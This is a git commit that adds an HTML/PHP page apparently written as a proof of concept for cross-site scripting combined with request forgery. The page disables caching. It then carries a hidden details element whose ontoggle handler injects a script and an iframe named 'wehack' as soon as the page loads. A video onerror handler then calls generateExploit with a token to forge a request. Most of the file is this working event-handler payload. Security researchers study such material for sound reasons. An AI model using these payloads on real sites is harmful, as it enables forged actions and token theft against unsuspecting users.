79f2bc9cc57fc97e02d964640be1cd970b50bd0e
Adam Willard <awillard@foregroundsecurity.com>
2017-12-07 20:38:36 -0500

    example.php

---
+++ xss/request-forgery/example.php
@@ -0,0 +1,20 @@
+<html>
+<head>
+<?php
+
+header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+header("Cache-Control: post-check=0, pre-check=0", false);
+header("Pragma: no-cache");
+?>
+</head>
+<body>
+
+<details open style='display:none' ontoggle="var p=document.getElementsByTagName('head')[0]; var d='rf.js';var a=document.createElement('script');a.type='text/javascript';a.src=d;a.setAttribute('defer', 'defer');p.appendChild(a);var c=document.createElement('iframe');c.src='rf.php';c.id='wehack';p.appendChild(c)"></details><video src=s onerror="generateExploit('wehack','','token','rf.php', 'get', 'a=1&b=2')"></video>
+
+
+<p>
+<a href="rf.js">Request Forgery Concept (JS)</a>
+
+</p>
+</body>
+</html>
